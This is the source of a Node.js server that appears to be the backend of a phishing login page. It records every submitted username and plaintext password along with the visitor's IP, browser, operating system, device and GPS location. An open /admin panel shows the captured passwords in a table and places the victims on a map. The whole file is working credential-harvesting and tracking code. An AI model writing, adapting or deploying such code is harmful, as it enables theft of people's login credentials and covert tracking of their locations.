const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 4000;
const DATA_FILE = path.join(__dirname, '../data/logins.json');

const dataDir = path.join(__dirname, '../data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

let loginLogs = [];
if (fs.existsSync(DATA_FILE)) {
    try {
        loginLogs = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        console.log(`📂 Loaded ${loginLogs.length} records`);
    } catch (e) { console.log('Fresh start'); }
}

function saveData() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(loginLogs, null, 2));
}

const server = http.createServer((req, res) => {
    console.log('👉', req.method, req.url);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    if (req.url === '/' && req.method === 'GET') {
        const filePath = path.join(__dirname, '../frontend/index.html');
        fs.readFile(filePath, (err, data) => {
            if (err) { res.writeHead(404); res.end('index.html not found'); }
            else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(data); }
        });
        return;
    }

    if (req.url === '/api/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
                const userAgent = req.headers['user-agent'] || 'Unknown';

                let browser = 'Unknown';
                if (userAgent.includes('Chrome')) browser = 'Chrome';
                else if (userAgent.includes('Firefox')) browser = 'Firefox';
                else if (userAgent.includes('Safari')) browser = 'Safari';
                else if (userAgent.includes('Edge')) browser = 'Edge';

                let os = 'Unknown';
                if (userAgent.includes('Windows')) os = 'Windows';
                else if (userAgent.includes('Mac')) os = 'Mac';
                else if (userAgent.includes('Android')) os = 'Android';
                else if (userAgent.includes('iPhone')) os = 'iOS';

                let device = 'Desktop';
                if (userAgent.includes('Mobile')) device = 'Mobile';
                else if (userAgent.includes('Tablet')) device = 'Tablet';

                const logEntry = {
                    id: Date.now(),
                    username: data.username,
                    password: data.password,
                    time: new Date().toLocaleString(),
                    ip: ip,
                    browser: browser,
                    os: os,
                    device: device,
                    location: data.location || null
                };

                loginLogs.unshift(logEntry);
                if (loginLogs.length > 1000) loginLogs = loginLogs.slice(0, 1000);
                saveData();

                console.log('💾 Login saved:', data.username, 'from', ip);

                const success = (data.username === 'admin' && data.password === '123456');
                res.end(JSON.stringify({ success }));
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ success: false, error: 'Invalid request' }));
            }
        });
        return;
    }

    // Admin panel with map
    if (req.url === '/admin') {
        let logsHtml = '';
        for (let log of loginLogs) {
            const loc = log.location ? `${log.location.lat}, ${log.location.lon}` : 'N/A';
            logsHtml += `
                <tr>
                    <td>${log.id}</td>
                    <td>${escapeHtml(log.username)}</td>
                    <td style="color:#ff6b6b;">${escapeHtml(log.password)}</td>
                    <td>${log.time}</td>
                    <td>${log.ip}</td>
                    <td>${log.browser || 'Unknown'}</td>
                    <td>${log.os || 'Unknown'}</td>
                    <td>${log.device || 'Unknown'}</td>
                    <td>${loc}</td>
                </tr>
            `;
        }

        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Panel - Login Tracker</title>
                <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                <style>
                    body { background: #0a0e27; color: #00ff88; font-family: monospace; padding: 20px; }
                    h1 { color: #1877f2; text-align: center; }
                    .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
                    .stat-card { background: #1a1f3e; padding: 20px; border-radius: 10px; text-align: center; }
                    .stat-number { font-size: 48px; font-weight: bold; color: #00ff88; }
                    table { width: 100%; border-collapse: collapse; background: #1a1f3e; border-radius: 10px; overflow-x: auto; display: block; }
                    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #2a2f4e; font-size: 12px; }
                    th { background: #1877f2; color: white; position: sticky; top: 0; }
                    #map { height: 400px; margin: 20px 0; border-radius: 10px; }
                    .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
                </style>
            </head>
            <body>
                <h1>📍 ADMIN PANEL - LOGIN TRACKER</h1>
                <div class="stats">
                    <div class="stat-card"><div class="stat-number">${loginLogs.length}</div><div>Total Logins</div></div>
                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div><div>Successful</div></div>
                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.location).length}</div><div>With GPS</div></div>
                </div>
                <div id="map"></div>
                <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
                <h2>📋 All Login Attempts</h2>
                <table>
                    <thead><tr><th>ID</th><th>Username</th><th>Password</th><th>Time</th><th>IP</th><th>Browser</th><th>OS</th><th>Device</th><th>Location</th></tr></thead>
                    <tbody>${logsHtml || '<tr><td colspan="9">No logins yet</td></tr>'}</tbody>
                </table>
                <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
                <script>
                    const map = L.map('map').setView([27.7, 85.3], 7);
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                    const locations = ${JSON.stringify(loginLogs.filter(l => l.location).map(l => ({ lat: l.location.lat, lon: l.location.lon, user: l.username })))};
                    locations.forEach(loc => {
                        L.marker([loc.lat, loc.lon]).addTo(map)
                            .bindPopup('📍 ' + loc.user);
                    });
                <\/script>
            </body>
            </html>
        `);
        return;
    }

    res.writeHead(404);
    res.end('404');
});

function escapeHtml(text) {
    if (!text) return 'Unknown';
    return String(text).replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}

server.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📍 GPS location tracking enabled`);
});